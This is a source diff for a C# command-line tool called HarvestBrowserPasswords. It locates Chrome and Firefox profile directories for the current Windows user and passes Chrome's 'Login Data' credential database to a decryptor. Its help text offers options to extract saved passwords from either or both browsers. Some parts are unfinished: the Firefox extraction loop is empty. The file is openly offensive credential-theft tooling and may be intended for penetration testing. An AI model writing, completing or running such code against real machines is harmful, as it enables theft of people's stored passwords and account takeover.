@@ -10,42 +10,35 @@ namespace HarvestBrowserPasswords
 {
     class Program
     {
+
         static void Main(string[] args)
         {
-            List<string> userAccountsCheck = new List<string>();
-            List<string> databaseFilePaths = new List<string>();
+            //Get username of current user account
+            string userAccountName = GetCurrentUser();
 
-            //Check if tool is running with Administrator privileges
-            if (IsAdministrator())
+            bool verbose = false;
+
+            //Parse command line arguments
+            if (args.Contains("-v"))
             {
-                Console.WriteLine("[+] Running as Administrator :)");
+                verbose = true;
+            }
+            if (args.Contains("-a"))
+            {
+                GetChromePasswords(userAccountName);
+                GetFirefoxPasswords(userAccountName);
+            }
+            else if (args.Contains("-g"))
+            {
+                GetChromePasswords(userAccountName);
+            }
+            else if (args.Contains("-f"))
+            {
+                GetFirefoxPasswords(userAccountName);
             }
             else
             {
-                Console.WriteLine("[-] Not Running as Administrator...");
-            }
-
-           Console.WriteLine("[*] Listing Interesting Local Accounts...");
-
-            //Get Usernames of all local accounts
-
-            foreach (ManagementObject userAccount in GetLocalMachineUsers())
-            {
-                string userAccountName = userAccount["Name"].ToString();
-                if (!CheckDefaultUsers(userAccountName))
-                {
-                    Console.WriteLine("[+] Found User: {0}", userAccountName);
-                    userAccountsCheck.Add(userAccountName);
-                }
-
-            }
-
-            Console.WriteLine("\n[*] Finding Google Chrome Profiles...");
-
-            //Locate SQLite database files containing users' Chrome Credentials and connect to database
-            foreach (string userAccount in userAccountsCheck)
-            {
-                DecryptChromeDatabase(userAccount);
+                DisplayHelpMessage();
             }
 
             Console.Write("Press any Key to Quit:\n$>");
@@ -53,58 +46,117 @@ namespace HarvestBrowserPasswords
 
         }
 
+        //Check if currently running in administrator context
         public static bool IsAdministrator()
         {
             var identity = WindowsIdentity.GetCurrent();
             var principal = new WindowsPrincipal(identity);
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
-
-        // Get local users on the machine
-        public static List<Object> GetLocalMachineUsers()
+      
+        public static void GetChromePasswords(string userAccountName)
         {
-            List<Object> userAccounts = new List<Object>();
-            SelectQuery query = new SelectQuery("Win32_UserAccount");
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
-            foreach (ManagementObject mgObject in searcher.Get())
-            {
-                try
-                {
-                    //Console.WriteLine("Username : {0}", envVar["Name"]);
-                    userAccounts.Add(mgObject);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine("Exception: {0}", e);
-                }
-            }
-            return userAccounts;
-        }
-
-        public static bool CheckDefaultUsers(string userAccountName)
-        {
-            List<string> defaultUserAccounts = new List<string> { "Guest", "HelpAssistant", "HomeGroupUser$", "DefaultAccount", "WDAGUtilityAccount" };
-            if (defaultUserAccounts.Contains(userAccountName))
-            {
-                return true;
-            }
-            else
-            {
-                return false;
-            }
-        }
-
-        public static void DecryptChromeDatabase(string userAccountName)
-        {
+            List<string> chromeProfiles = FindChromeProfiles(userAccountName);
             string loginDataFile = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
             if (File.Exists(loginDataFile))
             {
                 Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
-                ChromeDatabaseConnection conn = new ChromeDatabaseConnection(loginDataFile);
+                new ChromeDatabaseDecryptor(loginDataFile);
             }
-
         }
 
+        public static List<string> FindChromeProfiles(string userAccountName)
+        {
+            string chromeDirectory = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data";
+            List<string> profileDirectories = new List<string>();
 
+            foreach (string directory in profileDirectories)
+            {
+                Console.WriteLine(directory);
+            }
+
+            if (Directory.Exists(chromeDirectory))
+            {
+                //Add default profile location once existence of chrome directory is confirmed
+                profileDirectories.Add(chromeDirectory + "\\Default");
+                foreach (string directory in Directory.GetDirectories(chromeDirectory))
+                {
+                    if (directory.Contains("Profile "))
+                    {
+                        profileDirectories.Add(directory);
+                        //Console.WriteLine($"[+] Found Chrome Profile at {directory}");
+                    }
+                }
+            }
+            return profileDirectories;
+        }
+
+        public static void GetFirefoxPasswords(string userAccountName)
+        {
+            foreach (string profile in FindFirefoxProfiles(userAccountName))
+            {
+
+            }
+        }
+
+        public static List<string> FindFirefoxProfiles(string userAccountName)
+        {
+
+            //List to store profile directories
+            List<string> profileDirectories = new List<string>();
+
+            string roamingDir = $"C:\\Users\\{userAccountName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
+            string localDir = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Mozilla\\Firefox\\Profiles";
+
+            //Check roaming profile
+            if (Directory.Exists(roamingDir))
+            {
+                string[] roamingProfiles = Directory.GetDirectories(roamingDir);
+                foreach (string directory in roamingProfiles)
+                {
+                    profileDirectories.Add(directory);
+                    Console.WriteLine($"[+] Found Firefox Profile at {directory}");
+                }
+            }
+
+            //Check local profile
+            if (Directory.Exists(localDir))
+            {
+                string[] localDirectories = Directory.GetDirectories(localDir);
+                foreach (string directory in localDirectories)
+                {
+                    profileDirectories.Add(directory);
+                    Console.WriteLine($"[+] Found Firefox Profile at {directory}");
+                }
+            }
+
+            return profileDirectories;
+        }
+
+        public static string GetCurrentUser()
+        {
+            //Get username for currently running account (SamCompatible Enum format)
+            string userAccountSamCompatible = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            
+            //Remove domain and backslashes from name
+            int index = userAccountSamCompatible.IndexOf("\\", 0, userAccountSamCompatible.Length) + 1;
+            string userAccountName = userAccountSamCompatible.Substring(index);
+
+            Console.WriteLine($"[*] Running As: {userAccountSamCompatible}");
+
+            return userAccountName;
+        }
+
+        public static void DisplayHelpMessage()
+        {
+            Console.WriteLine("Help Message for HarvestBrowserPasswords.exe");
+            Console.WriteLine($"Usage: HarvestBrowserPasswords.exe <options>");
+            Console.WriteLine("Options:");
+            Console.WriteLine($"-h    Help                display this help message");
+            Console.WriteLine($"-g    Google Chrome       extract Google Chrome passwords");
+            Console.WriteLine($"-f    Firefox             extract Firefox passwords");
+            Console.WriteLine($"-a    All Browsers        extract passwords from all browsers");
+            Console.WriteLine($"-v    Verbose             write verbose output to console");
+        }
     }  
 }
